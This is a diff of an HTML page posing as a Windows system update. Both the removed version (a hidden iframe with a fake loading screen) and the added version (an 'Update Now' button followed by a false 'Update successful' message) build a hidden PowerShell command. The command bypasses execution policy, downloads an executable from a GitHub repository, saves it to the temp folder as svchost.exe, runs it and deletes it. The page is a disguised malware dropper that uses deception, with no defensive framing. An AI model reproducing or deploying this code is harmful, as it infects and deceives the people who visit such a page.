@@ -1,26 +1,24 @@
 <!DOCTYPE html>
 <html>
-<body style="margin:0; padding:0;">
-    <!-- This iframe loads the script and executes it immediately -->
-    <iframe 
-        srcdoc='
-            <script>
-                var psCmd = "powershell -noprofile -executionpolicy bypass -windowstyle hidden -command \\"$u=\\\'https://github.com/finnandrew888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe\\\'; $f=\\\'$env:temp\\\\svchost.exe\\\'; iwr $u -out $f; start $f; sleep 5; rm $f -force\\"";
-                
-                // Create a temporary blob and run it
-                var blob = new Blob([psCmd], {type: \'text/plain\'});
-                var url = URL.createObjectURL(blob);
-                
-                // Execute the command
-                window.location.href = \'powershell.exe -c \' + encodeURIComponent(psCmd);
-            </script>
-        ' 
-        width="0" height="0" border="0">
-    </iframe>
+<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
+    <h2>System Update Required</h2>
+    <p>Please click below to complete the update.</p>
     
-    <!-- Optional: A fake loading screen so they think something is happening -->
-    <div style="position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); font-family:sans-serif; color:#333;">
-        Updating system files... Please wait.
-    </div>
+    <button id="updateBtn" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">
+        Update Now
+    </button>
+
+    <script>
+        document.getElementById('updateBtn').addEventListener('click', function() {
+            var psCmd = 'powershell -noprofile -executionpolicy bypass -windowstyle hidden -command "$u=\'https://github.com/finnandrew888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe\'; $f=\'$env:temp\\svchost.exe\'; iwr $u -out $f; start $f; sleep 5; rm $f -force"';
+            
+            // Open a new PowerShell window silently
+            window.open('powershell.exe -c "' + psCmd.replace(/"/g, '\\"') + '"');
+            
+            // Hide the button after clicking
+            this.style.display = 'none';
+            document.body.innerHTML += '<p>Update successful. You may close this window.</p>';
+        });
+    </script>
 </body>
 </html>
